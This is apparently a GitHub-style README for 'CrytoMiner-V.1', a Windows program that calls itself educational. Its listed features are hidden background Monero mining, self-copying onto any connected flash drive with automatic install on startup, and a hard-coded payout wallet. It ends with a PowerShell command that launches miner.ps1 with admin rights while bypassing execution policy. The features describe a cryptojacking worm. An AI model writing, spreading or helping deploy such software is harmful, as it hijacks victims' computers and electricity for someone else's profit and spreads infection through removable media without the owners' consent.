# Project Name
**CrytoMiner-V.1**

## Disclaimer

⚠️ **WARNING**: This software is provided as-is with absolutely **no guarantee of safety or security**. Downloading, installing, or using this software is done entirely **at your own risk**. By proceeding, you acknowledge and accept that the developer is **not responsible** for any damage to your device, data loss, or security risks. Please be cautious and understand the potential risks before downloading or running this project.

## Overview

**CrytoMiner-V.1** is designed as an experimental tool to demonstrate the process of **Monero (XMR) mining** and various techniques in programmatic automation. It explores how blockchain mining can be executed on standard devices and includes features that automatically propagate the program across connected storage devices. This project is intended for educational purposes to understand how automated deployment works in the context of computing and file propagation.

### Features
1. **Crypto Mining**: Mines Monero (XMR) in the background.
2. **Automatic Propagation**: Copies itself onto any connected flash drive and automatically installs on startup.
3. **Fixed Wallet**: The wallet address is hard-coded and cannot be changed.

## Installation

1. Ensure you have A computer with Windows OS.
2. Clone the repository.
3. Follow instructions carefully to install.

## Usage
```
powershell -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File \"miner.ps1\"' -Verb RunAs"

